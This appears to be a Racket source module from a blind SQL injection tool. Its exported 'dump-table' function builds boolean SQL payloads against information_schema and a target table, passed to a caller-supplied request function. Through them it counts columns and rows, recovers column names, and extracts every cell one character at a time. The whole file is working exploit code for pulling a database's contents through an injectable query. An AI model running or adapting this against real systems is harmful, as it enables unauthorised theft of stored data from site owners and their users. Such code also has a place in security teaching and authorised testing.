#lang racket

(require "../valid-chars.rkt")

(provide dump-table)


(define count-columns
  (lambda (request-generator database table [n 0])
    (cond
      [(< n 50)
       (let ([result
               (request-generator
                 (format
                   "(SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '~a' AND TABLE_NAME = '~a' AND (DATA_TYPE = 'CHAR' OR DATA_TYPE = 'VARCHAR'))=~a"
                   database
                   table
                   (number->string n)))])
         (if result
           n
           (count-columns request-generator database table (add1 n))))]
      [else
        (begin
          (displayln "Exiting because there appears to be over 50 columns")
          (exit))])))

(define get-length-of-column-name
  (lambda (col-num request-generator database table [n 0])
    (cond
      [(< n 50)
       (let ([result
               (request-generator
                 (format
                   "(SELECT CHAR_LENGTH(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '~a' AND TABLE_NAME = '~a' AND (DATA_TYPE = 'CHAR' OR DATA_TYPE = 'VARCHAR') LIMIT 1 OFFSET ~a)=~a"
                   database
                   table
                   (number->string col-num)
                   (number->string n)))])
         (if result
           n
           (get-length-of-column-name
             col-num
             request-generator
             database
             table
             (add1 n))))]
      [else
        (begin
          (displayln
            "Exiting because the column appears to be longer than 50 chars")
          (exit))])))

(define iterate-name
  (lambda (col-num name-len request-generator database table [name-index-iter 0] [possible-char-iter 0])
    (cond
      [(>= name-index-iter name-len)
       (begin
         (displayln "")
         '())]
      [(>= possible-char-iter (vector-length valid-chars))
       (begin
         (displayln
           (string-append
             "Unable to determine name of column #"
             (number->string col-num)))
         (exit))]
      [(request-generator
         (format
           "(SELECT SUBSTR(LOWER(COLUMN_NAME), ~a, 1) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '~a' AND TABLE_NAME = '~a' AND (DATA_TYPE = 'CHAR' OR DATA_TYPE = 'VARCHAR') LIMIT 1 OFFSET ~a)='~a'"
           (number->string (add1 name-index-iter))
           database
           table
           (number->string (sub1 col-num))
           (vector-ref valid-chars possible-char-iter)))
       (let ([found-char (vector-ref valid-chars possible-char-iter)])
         (display found-char)
         (flush-output)
         (if (= name-index-iter 0)
           (string-join
             (cons
               found-char
               (iterate-name
                 col-num
                 name-len
                 request-generator
                 database
                 table
                 (add1 name-index-iter)))
             "")
           (cons
             found-char
               (iterate-name
                 col-num
                 name-len
                 request-generator
                 database
                 table
                 (add1 name-index-iter)))))]
      [else
        (iterate-name
          col-num
          name-len
          request-generator
          database
          table
          name-index-iter
          (add1 possible-char-iter))])))

(define get-columns
  (lambda (num-of-cols request-generator database table)
    (cond
      [(<= num-of-cols 0) '()]
      [else
        (cons
          (iterate-name
            num-of-cols
            (get-length-of-column-name
              (sub1 num-of-cols)
              request-generator
              database
              table)
            request-generator
            database
            table)
          (get-columns
            (sub1 num-of-cols)
            request-generator
            database
            table))])))

(define count-rows
  (lambda (request-generator database table [n 0])
    (cond
      [(< n 100)
       (let ([result
               (request-generator
                 (format
                   "(SELECT COUNT(*) FROM ~a.~a)=~a"
                   database
                   table
                   (number->string n)))])
         (if result
           n
           (count-rows
             request-generator
             database
             table
             (add1 n))))]
      [else
        (begin
          (displayln "Exiting because there appears to be over 100 rows")
          (exit))])))

(define get-length-of-cell
  (lambda (col-name row-num request-generator database table [n 0])
    (cond
      [(< n 50)
       (let ([result
               (request-generator
                 (format
                   "(SELECT CHAR_LENGTH(~a) FROM ~a.~a LIMIT 1 OFFSET ~a)=~a"
                   col-name
                   database
                   table
                   (number->string row-num)
                   (number->string n)))])
         (if result
           n
           (get-length-of-cell
             col-name
             row-num
             request-generator
             database
             table
             (add1 n))))]
      [else
        (begin
          (displayln "Exiting because the cell data appears to be longer than 50 chars")
          (exit))])))

(define iterate-cell-data
  (lambda (col-name
            row-num
            name-len
            request-generator
            database
            table
            [name-index-iter 0]
            [possible-char-iter 0])
    (cond
      [(>= name-index-iter name-len)
       (begin
         (displayln "")
         (if (= name-index-iter 0)
           ""
           '()))]
      [(>= possible-char-iter (vector-length valid-chars))
       (begin
         (displayln
           (string-append
             "Unable to determine data for row #"
             (number->string row-num)))
         (exit))]
      [(request-generator
         (format
           "(SELECT SUBSTR(LOWER(~a), ~a, 1) FROM ~a.~a LIMIT 1 OFFSET ~a)='~a'"
           col-name
           (number->string (add1 name-index-iter))
           database
           table
           (number->string (sub1 row-num))
           (vector-ref valid-chars possible-char-iter)))
       (let ([found-char (vector-ref valid-chars possible-char-iter)])
         (display found-char)
         (flush-output)
         (if (= name-index-iter 0)
           (string-join
             (cons
               found-char
               (iterate-cell-data
                 col-name
                 row-num
                 name-len
                 request-generator
                 database
                 table
                 (add1 name-index-iter)))
             "")
           (cons
             found-char
             (iterate-cell-data
               col-name
               row-num
               name-len
               request-generator
               database
               table
               (add1 name-index-iter)))))]
      [else
        (iterate-cell-data
          col-name
          row-num
          name-len
          request-generator
          database
          table
          name-index-iter
          (add1 possible-char-iter))])))

(define get-row
  (lambda (row-num columns request-generator database table)
    (cond
      [(empty? columns) '()]
      [else
        (cons
          (iterate-cell-data
            (car columns)
            row-num
            (get-length-of-cell
              (car columns)
              (sub1 row-num)
              request-generator
              database
              table)
            request-generator
            database
            table)
          (get-row
            row-num
            (cdr columns)
            request-generator
            database
            table))])))

(define get-rows
  (lambda (num-of-rows columns request-generator database table)
    (cond
      [(<= num-of-rows 0) '()]
      [else
        (begin
          (displayln "----------")
          (displayln
            (string-append
              "Getting row #"
              (number->string num-of-rows)))
          (cons
            (get-row
              num-of-rows
              columns
              request-generator
              database
              table)
            (get-rows
              (sub1 num-of-rows)
              columns
              request-generator
              database
              table)))])))

(define print-row
  (lambda (row)
    (displayln
      (string-join
        row
        ", "))))

(define print-rows
  (lambda (rows)
    (cond
      [(empty? rows) (displayln "")]
      [else
        (begin
          (print-row (car rows))
          (print-rows (cdr rows)))])))

(define dump-table
  (lambda (request-generator database table)
    (let ([num-of-cols (count-columns request-generator database table)])
      (displayln
        (string-append
          "Number of Columns: "
          (number->string num-of-cols)))
      (let ([columns (get-columns
                       num-of-cols
                       request-generator
                       database
                       table)])
        (print-row columns)
        (displayln "")
        (let ([num-of-rows
                (count-rows request-generator database table)])
          (displayln
            (string-append
              "Number of Rows: "
              (number->string num-of-rows)))
          (let ([rows
                  (get-rows
                    num-of-rows
                    columns
                    request-generator
                    database
                    table)])
            (displayln "----------")
            (displayln "")
            (displayln "--- Final Result ---")
            (print-row columns)
            (print-rows rows)))))))

